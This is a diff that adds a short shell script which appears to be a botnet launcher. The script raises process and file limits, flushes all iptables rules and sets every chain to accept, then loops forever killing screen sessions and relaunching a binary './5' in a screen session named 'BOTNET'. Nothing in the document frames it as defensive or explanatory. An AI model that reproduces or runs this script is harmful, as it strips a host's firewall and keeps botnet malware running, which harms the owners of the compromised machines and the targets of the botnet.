@@ -1,0 +1,13 @@
+ulimit -n 999999
+ulimit -u 999999
+iptables -F
+iptables -X
+iptables -t nat -F
+iptables -t nat -X
+iptables -t mangle -F
+iptables -t mangle -X
+iptables -P INPUT ACCEPT
+iptables -P OUTPUT ACCEPT
+iptables -P FORWARD ACCEPT
+while true; do killall -9 screen;
+screen -S BOTNET ./5; sleep 3600; done
